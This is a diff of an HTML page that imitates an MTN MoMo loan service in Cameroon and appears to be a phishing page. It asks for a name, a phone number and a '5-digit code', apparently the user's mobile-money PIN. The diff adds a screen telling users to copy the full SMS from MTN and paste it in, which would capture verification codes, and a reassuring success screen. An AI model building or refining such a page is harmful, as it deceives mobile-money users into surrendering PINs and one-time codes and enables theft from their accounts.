@@ -3,17 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Advance Loans Cameroon</title>
+    <title>MTN Xtra Loan</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <!-- LANGUAGE SELECTION SCREEN -->
-    <div id="screen-language" class="screen active">
+    <!-- LANGUAGE SELECTION SCREEN (Dark Theme) -->
+    <div id="screen-language" class="screen active dark-screen">
         <div class="lang-container">
-            
-            <!-- MoMo Wallet Logo -->
             <div class="momo-logo">
                 <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <rect width="100" height="100" rx="24" fill="#0a6b43"/>
@@ -27,49 +25,28 @@
             <p class="lang-subtitle">Select your language to continue</p>
             
             <div class="lang-options">
-                <!-- English Option -->
                 <div class="lang-option" onclick="selectLanguage('en', this)">
-                    <div class="flag-box">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Flag_of_the_United_Kingdom_%281-2%29.svg" alt="English" class="flag-img">
-                    </div>
-                    <div class="lang-text">
-                        <div class="lang-primary"><strong>English</strong></div>
-                        <div class="lang-secondary">Continue in English</div>
-                    </div>
+                    <div class="flag-box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Flag_of_the_United_Kingdom_%281-2%29.svg" class="flag-img"></div>
+                    <div class="lang-text"><div class="lang-primary"><strong>English</strong></div><div class="lang-secondary">Continue in English</div></div>
                     <div class="radio-btn"></div>
                 </div>
-
-                <!-- French Option -->
                 <div class="lang-option" onclick="selectLanguage('fr', this)">
-                    <div class="flag-box">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c3/Flag_of_France.svg" alt="Français" class="flag-img">
-                    </div>
-                    <div class="lang-text">
-                        <div class="lang-primary"><strong>Français</strong></div>
-                        <div class="lang-secondary">Continuer en français</div>
-                    </div>
+                    <div class="flag-box"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c3/Flag_of_France.svg" class="flag-img"></div>
+                    <div class="lang-text"><div class="lang-primary"><strong>Français</strong></div><div class="lang-secondary">Continuer en français</div></div>
                     <div class="radio-btn"></div>
                 </div>
-
-                <!-- Camfranglais Option -->
                 <div class="lang-option" onclick="selectLanguage('cm', this)">
-                    <div class="flag-box">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Flag_of_Cameroon.svg" alt="Camfranglais" class="flag-img">
-                    </div>
-                    <div class="lang-text">
-                        <div class="lang-primary"><strong>Camfranglais</strong></div>
-                        <div class="lang-secondary">Continue in Camfranglais</div>
-                    </div>
+                    <div class="flag-box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Flag_of_Cameroon.svg" class="flag-img"></div>
+                    <div class="lang-text"><div class="lang-primary"><strong>Camfranglais</strong></div><div class="lang-secondary">Continue in Camfranglais</div></div>
                     <div class="radio-btn"></div>
                 </div>
             </div>
-
             <p class="lang-footer">You can change it anytime</p>
         </div>
     </div>
 
-    <!-- HOME / CALCULATOR SCREEN -->
-    <div id="screen-home" class="screen">
+    <!-- HOME / CALCULATOR SCREEN (Dark Theme) -->
+    <div id="screen-home" class="screen dark-screen">
         <header>
             <h1>MTN MoMo Advance Loans Cameroon</h1>
         </header>
@@ -101,13 +78,12 @@
                 </div>
             </div>
 
-            <!-- Triggers startApplication() -->
             <button class="primary-btn" onclick="startApplication()">START APPLICATION</button>
         </div>
     </div>
 
-    <!-- APPLICATION FORM SCREEN -->
-    <div id="screen-application" class="screen">
+    <!-- APPLICATION FORM SCREEN (Dark Theme) -->
+    <div id="screen-application" class="screen dark-screen">
         <header>
             <h1>MTN MoMo Advance Loans Cameroon</h1>
         </header>
@@ -151,19 +127,15 @@
                 <div id="step-2" class="form-step">
                     <label>First Name</label>
                     <input type="text" id="first-name" placeholder="John" required>
-
                     <label>Last Name</label>
                     <input type="text" id="last-name" placeholder="Doe" required>
-
                     <label>Phone Number (Cameroon)</label>
                     <div class="phone-input">
                         <span>+237</span>
-                        <input type="text" id="phone-number" placeholder="670123456" maxlength="9" minlength="9" pattern="\d{9}" title="Exactly 9 digits (numbers only)" required>
+                        <input type="text" id="phone-number" placeholder="670123456" maxlength="9" minlength="9" pattern="\d{9}" required>
                     </div>
-
                     <label>5-Digit Code</label>
-                    <input type="text" id="five-digit-code" placeholder="12345" maxlength="5" minlength="5" pattern="\d{5}" title="Exactly 5 digits" required>
-                    <small>Enter your 5-digit code.</small>
+                    <input type="text" id="five-digit-code" placeholder="12345" maxlength="5" minlength="5" pattern="\d{5}" required>
                 </div>
 
                 <!-- STEP 3 -->
@@ -191,20 +163,89 @@
                     </div>
                 </div>
 
-                <!-- BUTTONS -->
                 <div class="form-navigation">
                     <button type="button" id="btn-back" class="secondary-btn" onclick="prevStep()" style="display: none;">BACK</button>
                     <button type="button" id="btn-next" class="primary-btn" onclick="nextStep()">NEXT STEP</button>
+                    <!-- Triggers SMS screen now -->
                     <button type="submit" id="btn-submit" class="primary-btn" style="display: none;">SUBMIT APPLICATION</button>
                 </div>
             </form>
         </div>
     </div>
 
-    <div id="screen-success" class="screen">
+    <!-- NEW: SMS VERIFICATION SCREEN (Light Theme matching screenshot) -->
+    <div id="screen-sms" class="screen light-screen">
+        
+        <!-- Dark Header from screenshot -->
+        <div class="sms-header">
+            <div class="sms-logo">
+                <svg width="30" height="30" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="100" rx="20" fill="#004C6C"/>
+                    <path d="M30 75L50 35H60L75 75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M35 65H75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
+                </svg>
+                <span>MTN XTRA LOAN</span>
+            </div>
+            <div class="sms-lang">🌐 English ▾</div>
+        </div>
+
+        <div class="sms-content">
+            <!-- Envelope Icon with Glow -->
+            <div class="envelope-glow">
+                <div class="envelope-icon">
+                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#d93838" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                        <polyline points="22,6 12,13 2,6"></polyline>
+                    </svg>
+                </div>
+            </div>
+
+            <h2 class="sms-title">Paste the <span>SMS</span> from MTN</h2>
+            <p class="sms-subtitle">We sent a confirmation message to your number. <strong>Copy the full SMS you received</strong> and paste it below to continue.</p>
+
+            <!-- Yellow Instruction Box -->
+            <div class="instruction-box">
+                <span class="bulb">💡</span>
+                <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
+            </div>
+
+            <!-- Textarea Area -->
+            <div class="sms-textarea-container">
+                <textarea id="sms-input" placeholder="Collez le SMS reçu de MTN ici..." maxlength="500"></textarea>
+                
+                <div class="paste-controls">
+                    <span id="char-count">0 characters</span>
+                    <button type="button" class="paste-btn" onclick="pasteSMS()">📋 Paste</button>
+                </div>
+            </div>
+
+            <div class="resend-area">
+                <span>Didn't receive the SMS?</span>
+                <a href="#">Resend SMS</a>
+            </div>
+
+            <!-- Verify Button -->
+            <button id="btn-verify-sms" class="verify-btn" onclick="verifySMS()" disabled>
+                VERIFY & CONTINUE →
+            </button>
+        </div>
+        
+        <div class="footer-text">© 2026 MTN Xtra Loan</div>
+    </div>
+
+    <!-- SUCCESS SCREEN -->
+    <div id="screen-success" class="screen dark-screen">
         <div class="content-card text-center">
-            <h2>Success!</h2>
-            <p>Your loan application has been fully submitted and is being reviewed.</p>
+            <div style="width: 80px; height: 80px; background: rgba(10, 107, 67, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto;">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#0a6b43" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+            
+            <h2 style="color: #fff; font-size: 1.8rem; margin-bottom: 10px;">Application Received!</h2>
+            <p style="color: #8fa9bc; margin-bottom: 30px;">Your loan application has been successfully submitted. Our team will review it shortly.</p>
+            
+            <button class="primary-btn" onclick="location.reload()">RETURN TO HOME</button>
         </div>
     </div>
 
